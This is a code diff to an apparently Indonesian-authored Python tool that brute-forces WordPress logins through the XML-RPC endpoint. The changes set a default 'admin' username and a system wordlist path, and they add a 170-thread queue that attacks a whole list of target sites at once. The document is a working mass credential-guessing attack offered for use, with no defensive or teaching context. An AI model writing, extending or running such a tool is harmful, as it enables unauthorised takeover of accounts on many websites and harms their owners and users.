@@ -7,14 +7,16 @@ import requests
 import random
 import urllib3
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from queue import Queue
+import threading
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class XMLRPCBRUTEFORCE:
     def __init__(self, url):
-        self.file_pass = "dict_password.txt"
+        self.file_pass = "/usr/share/wordlists/pass.txt"
         self.website = url
-        self.username = []
+        self.username = ["admin"]
         self.password = []
 
         self.useragents = [
@@ -50,7 +52,6 @@ class XMLRPCBRUTEFORCE:
                         break
         except:
             pass
-
 
     def extract_domain_without_tld(self, domain):
         return domain.split(".")[0] if "." in domain else domain
@@ -216,7 +217,6 @@ class XMLRPCBRUTEFORCE:
             pass
 
     def check_wp(self):
-
         try:
             r = requests.get(f"{self.website}/wp-login.php", timeout=10, verify=False, headers=self.header)
             if "wp-login.php" in r.text and r.status_code == 200:
@@ -259,7 +259,6 @@ class XMLRPCBRUTEFORCE:
                             
 
     def main(self):
-
         if self.check_wp() == False:
             print(f"{self.warna('[!]', 'merah')} NOT A WORDPRESS {self.website} [{self.warna("SKIP", 'merah')}]")
             return
@@ -268,6 +267,13 @@ class XMLRPCBRUTEFORCE:
             print(f"{self.warna('[@]', 'biru')} {self.website} => Running on this target!.")
             self.xmlrpc_brute_force()
             print("\n")
+
+def process_target(queue):
+    while not queue.empty():
+        website = queue.get()
+        run = XMLRPCBRUTEFORCE(website)
+        run.main()
+        queue.task_done()
 
 if __name__ == "__main__":
     if name == "nt":
@@ -300,13 +306,22 @@ if __name__ == "__main__":
         try:
             list_web = input(f"[*] LIST : ")
             print("\n")
+            queue = Queue()
             with open(list_web, "r") as f:
                 for website in f:
                     url = website.strip()
-                    run = XMLRPCBRUTEFORCE(url)
-                    run.main()
+                    queue.put(url)
+
+            threads = []
+            for _ in range(170):  # Adjust the number of threads as needed
+                thread = threading.Thread(target=process_target, args=(queue,))
+                thread.start()
+                threads.append(thread)
+
+            for thread in threads:
+                thread.join()
+
         except Exception as e:
             print(f"[!] Error : {e}")
     else:
         print("[!] Wrong input")
-    
